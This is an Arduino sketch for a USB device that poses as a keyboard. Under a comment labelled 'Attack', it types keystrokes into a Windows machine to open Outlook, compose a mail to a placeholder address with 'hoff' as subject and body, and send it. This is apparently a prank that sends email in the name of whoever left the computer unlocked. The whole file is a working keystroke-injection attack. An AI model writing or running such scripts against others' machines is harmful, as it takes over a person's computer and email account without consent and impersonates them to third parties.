char winKey = KEY_LEFT_GUI;
char enter = KEY_RETURN;
char ctrlKey = KEY_LEFT_CTRL;
char tab = KEY_TAB;
//char leftAlt = KEY_LEFT_ALT;

void setup() {
  //Initialization
  delay(500);
  int led = 13;
  digitalWrite(led, HIGH);
  delay(500);
  digitalWrite(led, LOW);
  delay(500);
  digitalWrite(led, HIGH);
  delay(500);
  digitalWrite(led, LOW);
  delay(500);
  digitalWrite(led, HIGH);
  delay(500);
  digitalWrite(led, LOW);
  delay(500);
  //Attack
  Keyboard.begin();
  //Open Start menu
  Keyboard.press(winKey);
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  //Test
  Keyboard.press(winKey);
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  //Open outlook
  Keyboard.print("outlook");
  delay(500);
  Keyboard.press(enter);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  //Open new mail
  Keyboard.press(ctrlKey);
  Keyboard.press('n');
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  //Enter mail details
  Keyboard.print("<email>");
  delay(500);
  Keyboard.press(tab);
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(tab);
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(tab);
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(tab);
  delay(100);
  Keyboard.releaseAll();
  delay(1500);
  Keyboard.print("hoff");
  delay(500);
  Keyboard.press(tab);
  delay(100);
  Keyboard.releaseAll();
  delay(1500);
  Keyboard.print("hoff");
  delay(500);
  //Send mail
  Keyboard.press(ctrlKey);
  delay(100);
  Keyboard.press(enter);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  //Keyboard.press('enter');
  //delay(100);
  //Keyboard.releaseAll();
  Keyboard.end();
}

void loop() {
 //do nothing
}
